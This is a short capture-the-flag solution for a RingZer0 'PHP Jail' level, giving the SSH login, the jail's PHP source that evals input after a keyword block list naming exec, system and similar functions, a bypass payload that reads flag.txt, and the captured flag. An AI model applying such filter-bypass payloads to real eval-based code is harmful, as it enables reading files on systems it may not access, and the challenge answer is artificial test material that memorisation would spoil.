ssh level1@challenges.ringzer0ctf.com -p 10223

Mot de passe: level1

```php
<?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("PHP Jail need an argument\n");

function filter($var) {
        if(preg_match('/(`|open|exec|pass|system|\$|\/)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        eval($var);
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?>
```

echo file_get_contents('flag.txt');

FLAG-sW66QEY4y6724723c7w1i0oMt179E75y